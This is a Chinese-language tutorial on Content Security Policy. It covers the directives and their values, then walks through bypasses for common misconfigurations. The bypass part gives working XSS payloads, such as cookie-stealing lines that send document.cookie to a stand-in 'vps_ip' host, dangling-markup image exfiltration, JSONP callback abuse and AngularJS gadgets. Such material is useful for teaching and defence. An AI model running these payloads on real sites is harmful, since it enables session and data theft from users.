何为CSP？

CSP（Content Security Policy）指的是内容安全策略，是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本攻击 (XSS) 和数据注入等攻击。它以白名单的机制对网站加载或执行的资源起作用。常出现一些csp配置错误使得其可以被bypass。

CSP使用方式

1.通过meta标签设置

<meta http-equiv="Content-Security-Policy" content="default-src 'self' *.xx.com *.xx.cn 'unsafe-inline' 'unsafe-eval';">

2.服务端配置（在HTTP响应头）

常见CSP指令

  • style-src：样式表

  • img-src：图像

  • script-src：外部脚本

  • media-src：媒体文件（音频和视频）

  • font-src：字体文件

  • object-src：插件（比如 Flash）

  • child-src：框架

  • frame-ancestors：嵌入的外部资源（比如<frame>、<iframe>、<embed>和<applet>）

  • connect-src：HTTP 连接（通过XHR、WebSockets、EventSource等）

  • worker-src：worker脚本

  • manifest-src：manifest 文件

  • dedault-src：默认配置

  • frame-ancestors：限制嵌入框架的网页

  • base-uri：限制<base#href>

  • form-action：限制<form#action>

  • block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）

  • upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议

  • plugin-types：限制可以使用的插件格式

  • sandbox：浏览器行为的限制，比如不能有弹出窗口等。

CSP指令值

  • *：星号表示允许任何URL资源，没有限制；

  • self：表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；

  • data：仅允许数据模式（如Base64编码的图片）方式加载资源；

  • none：不允许任何资源被加载；

  • unsafe-inline：允许使用内联资源，例如内联<script>标签，内联事件处理器，内联<style>标签等，但出于安全考虑，不建议使用；

  • nonce：通过使用一次性加密字符来定义可以执行的内联js脚本，服务端生成一次性加密字符并且只能使用一次；

一些常见场景

文件上传+self

Content-Security-Policy: script-src 'self'; object-src 'none' ;

假设攻击者可以上传文本文件到example.com，可以在txt中写入恶意js代码，然后通过标签加载。

<script src="https://example.com/attacker.txt" ></script>

即使服务器将Content-Type响应头设置为text/plain，浏览器也可能将文本文件内容解析为js代码。此时因 example.com在白名单内，成功绕过了csp。如果开发者部署XCTO头并指定了正确的值，Content-Type响应头则可以缓解XSS攻击。

unsafe-inline

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';

csp允许内联脚本的执行，此时可以任意执行js，下面考虑如何绕过白名单'self'的限制。

1.利用<link>标签预加载外部资源(现在版本被很多浏览器限制)

<!-- firefox --><link rel="dns-prefetch" href="//${cookie}.vps_ip">
<!-- chrome --><link rel="prefetch" href="//vps_ip?${cookie}">

2.利用location.href跳转

<script>location.href=http://vps_ip?a+document.cookie</script>

3.利用跨域请求

var a=document.createElement("a");a.href='http://vps_ip?cookie='+escape(document.cookie);a.click();

unsafe-eval

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';

csp允许使用eval()等函数将字符串作为代码执行，同样，这种配置是不够安全的，与上文相似的，可以构造payload来实现xss攻击。

例：打出弹窗

<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>

iframe标签

csp指定只能加载同源值时，可以使用iframe标签加载不带有csp的同源资源来绕过csp限制。

在Chrome下，iframe标签支持csp属性，这有时候可以用来绕过一些防御，例如"http://xxx"页面有个js库会过滤XSS向量，我们就可以使用csp属性来禁掉这个js库。

<iframe csp="script-src 'unsafe-inline'" src="http://xxx"></iframe>

指定目录白名单

Content-Security-Policy: default-src 'self '; script-src http://127.0.0.1/a/;

csp限制script-src为http://test.com/a/。

1.利用302重定向，此时通过访问a目录下的文件触发302重定向到http://test.com/b/，即通过302重定向绕过了csp限制。

2.可以通过用url编码的方式绕过csp对文件路径的限制。

例：https://example.com/a/在csp指定的白名单内，攻击者通过构造https://example.com/a%2f..%2fhack/evil.js的方式绕过csp执行恶意代码（可以配合文件上传使用）

第三方站点+jsonp

Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none';

csp将特定的域列入白名单内，jsonp端点允许不安全的回调方法可能会导致xss。

<scriptsrc="/path/jsonp?callback=alert(document.domain)//"></script>

加载外部图片

Content-Security-Policy: default-src 'self';script-src 'self'; img-src *;

此时csp允许加载外部的图片，但是没有unsafe-inline导致js无法执行，可以利用不完整的标签将后面的数据带出，如

http://127.0.0.1/csp.php?xss=<img src="//vps_ip?a=

直到原有的数据将该值闭合，所有的数据都会被当作a的值被带到攻击者的vps上（不适用于chrome）。

使用不安全的第三方库

Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none';

此时csp指定了该js库在白名单内，可以通过库中易于攻击版本的js文件来bypass。

例：利用js库打出弹窗

<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script><div ng-app ng-csp>  {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}</div>
"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script><div ng-app ng-csp>  {{$eval.constructor('alert(1)')()}}</div>
